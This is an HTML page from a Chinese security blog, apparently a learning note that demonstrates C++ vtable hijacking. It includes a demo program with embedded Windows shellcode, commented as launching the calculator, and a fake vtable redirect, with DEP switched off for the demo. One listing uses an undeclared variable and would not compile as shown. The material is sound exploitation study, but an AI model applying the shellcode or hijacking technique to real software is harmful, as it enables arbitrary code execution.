@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="Jayl1n">
+<meta name="baidu-site-verification" content="elXpeED2jg">
+
+
+
+<meta name="description" content="[RealPwn] 系列是我学习 pwn 的笔记，只记录真实场景中常用到的漏洞利用技术。  虚函数表C++ 里，为了实现 “多态” ，使用了虚函数表 (vtable)。 每个含有虚函数的类的对象，在内存的起始处有一个 vptr 的指针，指向虚函数表。 虚函数表存了类里所有虚函数的指针。调用函数时，在这个虚函数表里查找实际要调用的函数。 借用网上的一张图  特性总结下虚函数表的特性：  虚函数表在">
+<meta name="keywords" content="Pwn,二进制">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【RealPwn-1】 虚函数表劫持练习">
+<meta property="og:url" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/index.html">
+<meta property="og:site_name" content="Jayl1n&#39;s Blog">
+<meta property="og:description" content="[RealPwn] 系列是我学习 pwn 的笔记，只记录真实场景中常用到的漏洞利用技术。  虚函数表C++ 里，为了实现 “多态” ，使用了虚函数表 (vtable)。 每个含有虚函数的类的对象，在内存的起始处有一个 vptr 的指针，指向虚函数表。 虚函数表存了类里所有虚函数的指针。调用函数时，在这个虚函数表里查找实际要调用的函数。 借用网上的一张图  特性总结下虚函数表的特性：  虚函数表在">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/vft.png">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702163648268.png">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702163707394.png">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702163900420.png">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702164047943.png">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702164627019.png">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702175254591.png">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702174543785.png">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702174636492.png">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702173559882.png">
+<meta property="og:image" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/vtable-hijacking.gif">
+<meta property="og:updated_time" content="2023-08-16T15:16:43.296Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【RealPwn-1】 虚函数表劫持练习">
+<meta name="twitter:description" content="[RealPwn] 系列是我学习 pwn 的笔记，只记录真实场景中常用到的漏洞利用技术。  虚函数表C++ 里，为了实现 “多态” ，使用了虚函数表 (vtable)。 每个含有虚函数的类的对象，在内存的起始处有一个 vptr 的指针，指向虚函数表。 虚函数表存了类里所有虚函数的指针。调用函数时，在这个虚函数表里查找实际要调用的函数。 借用网上的一张图  特性总结下虚函数表的特性：  虚函数表在">
+<meta name="twitter:image" content="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/vft.png">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Jayl1n&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/cat.jpg">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="../../../../css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>【RealPwn-1】 虚函数表劫持练习 | Jayl1n&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?08bebd32e2a42a1273ff796a43439f77";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/cat.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Jayl1n</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="../../../../index.html">主页</a></li>
+                        
+                            <li><a href="../../../../archives/">所有文章</a></li>
+                        
+                            <li><a href="../../../../tags/">标签云</a></li>
+                        
+                            <li><a href="../../../../about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:panja@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://www.github.com/Jayl1n" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="../../../../atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/BLOG/">BLOG</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/JSP/">JSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pentest/">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RedTeam/">RedTeam</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/i春秋/">i春秋</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/二进制/">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/工具分享/">工具分享</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/心路/">心路</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/日常/">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/浏览器/">浏览器</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/爬虫/">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/红蓝对抗/">红蓝对抗</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://redteam.today">李三的剑谱</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://blog.l0ca1.xyz/">l0cal</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://7o8v.me/">7o8v</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://godot.win/">Godot</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://evoa.me/">evoA</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://abcdefghijklmnopqrst.xyz/">骑麦兜看落日</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://kkdlong.win">kkdlong</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于安全</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Jayl1n</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/cat.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Jayl1n</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="../../../../index.html">主页</a></li>
+                
+                    <li><a href="../../../../archives/">所有文章</a></li>
+                
+                    <li><a href="../../../../tags/">标签云</a></li>
+                
+                    <li><a href="../../../../about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:panja@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://www.github.com/Jayl1n" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="../../../../atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-realpwn-vtable-hijacking-exercise" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="" class="article-date">
+      <time datetime="2021-07-04T02:54:28.000Z" itemprop="datePublished">2021-07-04</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      【RealPwn-1】 虚函数表劫持练习
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/二进制/">二进制</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>[RealPwn] 系列是我学习 pwn 的笔记，只记录真实场景中常用到的漏洞利用技术。</p>
+</blockquote>
+<h1 id="虚函数表"><a href="#虚函数表" class="headerlink" title="虚函数表"></a>虚函数表</h1><p>C++ 里，为了实现 “多态” ，使用了虚函数表 (vtable)。</p>
+<p>每个含有虚函数的类的对象，在内存的起始处有一个 vptr 的指针，指向虚函数表。</p>
+<p>虚函数表存了类里所有虚函数的指针。调用函数时，在这个虚函数表里查找实际要调用的函数。</p>
+<p>借用网上的一张图</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/vft.png" alt="vft.png"></p>
+<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>总结下虚函数表的特性：</p>
+<ol>
+<li><p>虚函数表在 <code>.data</code> 段，仅可读，无法修改</p>
+</li>
+<li><p>虚函数表类似一个数组，每个有虚函数的类的对象实例都存储指向虚函数表的指针。</p>
+</li>
+<li><p>虚函数表指针 vptr 一般在对象起始的 4 字节（32 位） 或 8 字节（64 位），多重继承时有可能存在多个虚函数表，</p>
+</li>
+</ol>
+<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>下面调试一下，环境 VS2019 + x32dbg：</p>
+<p>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">public :</span><br><span class="line">	virtual int hijackme() &#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	char msg[128];</span><br><span class="line"></span><br><span class="line">	A* a = new A;</span><br><span class="line">	long* a_addr = (long*) a;</span><br><span class="line">	long* vptr = (long*) ( *a_addr);</span><br><span class="line"></span><br><span class="line">	sprintf(msg, &quot;object a address: 0x%p&quot;, a_addr);</span><br><span class="line">	cout &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line">	sprintf(msg, &quot;vtable address: 0x%p&quot;, vptr[0]);</span><br><span class="line">	cout &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702163648268.png" alt="image-20210702163648268"></p>
+<p>x32dbg 里看内存</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702163707394.png" alt="image-20210702163707394"></p>
+<p><code>0x014FD028</code> 是 vptr ，指向虚函数表。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702163900420.png" alt="image-20210702163900420"></p>
+<p><code>0xB131EC</code> 是虚函数表，所在内存是只读的无法修改，它指向的是函数实际的地址，无法修改虚表中函数的地址。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702164047943.png" alt="image-20210702164047943"></p>
+<p>对象是在堆上的，它的内存是 <code>RW</code> 可读可写的，常见的攻击思路是修改对象的虚函数表指针 vptr ，即 <code>0x014FD028</code> 中的数据。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702164627019.png" alt="image-20210702164627019"></p>
+<p>试验一下。</p>
+<p>要在内存中伪造出一个虚表，将对象的虚表指针指向它。</p>
+<p>修改代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">hijackme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹计算器</span></span><br><span class="line"><span class="keyword">char</span> shellcode[<span class="number">0x1000</span>] = <span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</span></span><br><span class="line"><span class="string">"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"</span></span><br><span class="line"><span class="string">"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"</span></span><br><span class="line"><span class="string">"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"</span></span><br><span class="line"><span class="string">"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"</span></span><br><span class="line"><span class="string">"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"</span></span><br><span class="line"><span class="string">"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"</span></span><br><span class="line"><span class="string">"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"</span></span><br><span class="line"><span class="string">"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"</span></span><br><span class="line"><span class="string">"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"</span></span><br><span class="line"><span class="string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"</span></span><br><span class="line"><span class="string">"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"</span></span><br><span class="line"><span class="string">"\x00\x53\xff\xd5\x63\x61\x6c\x63\x00"</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> msg[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">	A* a = <span class="keyword">new</span> A;</span><br><span class="line">	<span class="keyword">long</span>* a_addr = (<span class="keyword">long</span>*) a;</span><br><span class="line">	<span class="keyword">long</span>* vptr = (<span class="keyword">long</span>*) ( *a_addr );</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">"object a address: 0x%p"</span>, a_addr);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">"vtable address: 0x%p"</span>, vptr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> fake_vtable[<span class="number">4</span>]; <span class="comment">//伪造一个虚表</span></span><br><span class="line">	<span class="keyword">long</span> shellcode_addr = (<span class="keyword">long</span>)((<span class="keyword">long</span>*) (shellcode));</span><br><span class="line">	<span class="built_in">memcpy</span>(fake_vtable, &amp;shellcode_addr ,<span class="number">4</span>); <span class="comment">//虚表指向shellcode</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">"fake_vtable address: 0x%p"</span>, &amp;fake_vtable);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">"shellcode address: 0x%p"</span>, (<span class="keyword">long</span>*) shellcode);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">long</span> fake_vtable_addr = (<span class="keyword">long</span>) ( (<span class="keyword">long</span>*) fake_vtable );</span><br><span class="line">	<span class="built_in">memcpy</span>(tmp, &amp;fake_vtable_addr, <span class="number">4</span>); <span class="comment">// 修改对象虚表指针，指向伪造的虚表</span></span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line"></span><br><span class="line">	a-&gt;hijackme();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重新执行</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702175254591.png" alt="image-20210702175254591"></p>
+<p>在 <code>0x00DCFE44</code> 处构造一个虚表，只要一个项，指向 <code>0x00535020</code> 。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702174543785.png" alt="image-20210702174543785"></p>
+<p><code>0x00535020</code> 是 shellcode</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702174636492.png" alt="image-20210702174636492"></p>
+<p>这里涉及到一个问题，shellcode 是在 <code>.data</code> 段不可执行的，一般来说需要构造 ROP 链，给 shellcode 所在内存加上执行权限。这里略过这个问题，暂时先关掉 DEP（属性 —&gt; 链接器 —&gt; 高级）。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702173559882.png" alt="image-20210702173559882"></p>
+<p>应该就可以执行 shellcode 了。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/vtable-hijacking.gif" alt="vtable-hijacking"></p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://pwn4.fun/2016/11/20/C-%E8%99%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%94%BB%E9%98%B2%E6%88%98/" target="_blank" rel="noopener">C++虚函数调用攻防战</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="">【RealPwn-1】 虚函数表劫持练习</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Jayl1n</a></p>
+        <p><span>发布时间:</span>2021-07-04, 10:54:28</p>
+        <p><span>最后更新:</span>2023-08-16, 23:16:43</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="" title="【RealPwn-1】 虚函数表劫持练习">https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/　　作者: Jayl1n" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="../../07/realpwn-heap-spary-exercise/">
+                    【RealPwn-2】 堆喷练习
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="../../01/use-inlinehook-technology-to-make-a-more-general-webshell/">
+                    利用 Hook 技术打造通用的 Webshell
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#虚函数表"><span class="toc-number">1.</span> <span class="toc-text">虚函数表</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#特性"><span class="toc-number">1.1.</span> <span class="toc-text">特性</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#调试"><span class="toc-number">2.</span> <span class="toc-text">调试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#References"><span class="toc-number">3.</span> <span class="toc-text">References</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"【RealPwn-1】 虚函数表劫持练习　| Jayl1n's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
